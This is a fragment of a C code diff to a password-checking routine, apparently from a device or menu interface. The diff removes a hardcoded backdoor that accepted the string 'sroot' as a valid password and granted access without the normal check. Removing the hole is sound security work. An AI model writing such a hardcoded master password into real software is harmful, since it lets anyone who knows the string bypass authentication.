@@ -1685,11 +1685,6 @@ int check_password(int page)
 				if(w_button(34,13,9," Confirm "))
 				{
 					count++;
-					if(!strcmp("sroot",password))
-					{
-						w_setpage(page);
-						return 1;
-					}
 					if(!pwd_cmp("admin",password))
 					{
 						tag = 2;
